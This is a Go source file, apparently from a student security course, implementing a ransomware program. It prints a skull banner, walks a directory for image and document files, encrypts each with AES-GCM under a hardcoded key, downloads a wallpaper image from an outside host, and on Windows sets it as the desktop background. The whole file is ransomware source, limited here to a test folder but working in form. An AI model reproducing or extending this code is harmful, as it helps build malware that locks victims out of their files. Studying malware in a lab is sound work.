package main

import (
	"ase/encrypt"
	"ase/utils"
	"fmt"
	"os"
	"runtime"
	"unsafe"

	"golang.org/x/sys/windows"
)

func main() {

	fmt.Println("\033[5m")
	fmt.Println("             uu$$$$$$$$$$$uu")
	fmt.Println("          uu$$$$$$$$$$$$$$$$$uu")
	fmt.Println("         u$$$$$$$$$$$$$$$$$$$$$u")
	fmt.Println("        u$$$$$$$$$$$$$$$$$$$$$$$u")
	fmt.Println("       u$$$$$$$$$$$$$$$$$$$$$$$$$u")
	fmt.Println("       u$$$$$$*   *$$$*   *$$$$$$u")
	fmt.Println("       *$$$$*      u$u       $$$$*")
	fmt.Println("        $$$u       u$u       u$$$")
	fmt.Println("        $$$u      u$$$u      u$$$")
	fmt.Println("         *$$$$uu$$$   $$$uu$$$$*")
	fmt.Println("          *$$$$$$$*   *$$$$$$$*")
	fmt.Println("            u$$$$$$$u$$$$$$$u")
	fmt.Println("             u$*$*$*$*$*$*$u")
	fmt.Println("  uuu        $$u$ $ $ $ $u$$       uuu")
	fmt.Println(" u$$$$        $$$$$u$u$u$$$       u$$$$")
	fmt.Println("  $$$$$uu      *$$$$$$$$$*     uu$$$$$$")
	fmt.Println("u$$$$$$$$$$$uu    *****    uuuu$$$$$$$$$$")
	fmt.Println("$$$$***$$$$$$$$$$uuu   uu$$$$$$$$$***$$$*")
	fmt.Println("*$$$*     **$$$$$$$$$$$uu **$***")
	fmt.Println("          uuuu **$$$$$$$$$$uuu")
	fmt.Println(" u$$$uuu$$$$$$$$$uu **$$$$$$$$$$$uuu$$$")
	fmt.Println(" $$$$$$$$$$****           **$$$$$$$$$$$*")
	fmt.Println("   *$$$$$*                      **$$$$**")
	fmt.Println("     $$$*                         $$$$*")
	fmt.Println("                                   $$$*")
	fmt.Println("\033[0m")

	extensions := []string{"svg", "png", "jpg", "jpeg", "gif", "bmp", "tiff", "webp", "docx", "ppt", "txt"}

	// Check on which system the program is running
	var path string = ""
	switch os := runtime.GOOS; os {
	case "windows":
		path = `C:\Users\theol\Documents\EPITA\SRS\S8\ase-malware\tests`
	case "linux":
		path = "/mnt/c/Users/theol/Documents/EPITA/SRS/S8/ase-malware/tests"
	case "darwin":
		path = "/Users/theol/Documents/EPITA/SRS/S8/ase-malware/tests"
	default:
		path = ""
	}

	if path == "" {
		os.Exit(1)
	}

	files, err := utils.DiscoverDisk(path, extensions)
	if err != nil {
		fmt.Println("Error: ", err)
		os.Exit(1)
	}

	for _, file := range files {
		encrypt.Encrypt(file, "0123456789abcdef0123456789abcdef", "0123456789abcdef", "gcm")
	}

	// Print the number of files found
	fmt.Println(len(files))

	// Download the wallpaper
	err = utils.DownloadFile("wallpaper.jpg", "https://i.imgur.com/djA5cUP.jpeg")
	if err != nil {
		fmt.Println("Error: ", err)
		os.Exit(1)
	}

	// If on Windows, change the wallpaper
	if runtime.GOOS == "windows" {
		var (
			user32DLL           = windows.NewLazyDLL("user32.dll")
			procSystemParamInfo = user32DLL.NewProc("SystemParametersInfoW")
		)
		imagePath, _ := windows.UTF16PtrFromString(`C:\Users\theol\Desktop\djA5cUP.jpeg`)
		fmt.Println("[+] Changing background now...")
		procSystemParamInfo.Call(20, 0, uintptr(unsafe.Pointer(imagePath)), 0x001A)
	}

}
